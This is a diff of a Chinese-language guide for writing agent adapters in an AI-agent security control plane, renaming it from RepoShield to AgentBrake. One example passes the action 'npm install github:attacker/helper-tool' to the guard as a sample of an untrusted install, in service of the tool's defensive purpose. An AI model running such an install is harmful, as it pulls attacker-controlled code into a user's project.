@@ -1,13 +1,13 @@
 # Agent Adapter 开发指南
 
-RepoShield 的 adapter 不负责生成代码，只负责把外部 agent 的计划和工具调用转成 RepoShield 可理解的动作，并严格执行控制平面的决策。
+AgentBrake 的 adapter 不负责生成代码，只负责把外部 agent 的计划和工具调用转成 AgentBrake 可理解的动作，并严格执行控制平面的决策。
 
 ## 最小 adapter 责任
 
 ```python
-from reposhield.control_plane import RepoShieldControlPlane
+from agentbrake.control_plane import AgentBrakeControlPlane
 
-cp = RepoShieldControlPlane(repo)
+cp = AgentBrakeControlPlane(repo)
 cp.build_contract(user_task)
 action, decision = cp.guard_action(raw_action, source_ids=[...], tool='Bash')
 
@@ -24,10 +24,10 @@ else:
 ## 已内置 adapter
 
 ```text
-src/reposhield/adapters/base.py
-src/reposhield/adapters/protocol.py
-src/reposhield/adapters/generic_cli.py
-src/reposhield/adapters/aider.py
+src/agentbrake/adapters/base.py
+src/agentbrake/adapters/protocol.py
+src/agentbrake/adapters/generic_cli.py
+src/agentbrake/adapters/aider.py
 ```
 
 `generic_cli` 支持 transcript 行：
@@ -54,7 +54,7 @@ cp.guard_action('npm install github:attacker/helper-tool', source_ids=[src.sourc
 
 ## 审批一致性
 
-adapter 不应把 approval 当作通用许可。RepoShield 的 approval 绑定：
+adapter 不应把 approval 当作通用许可。AgentBrake 的 approval 绑定：
 
 ```text
 plan_hash
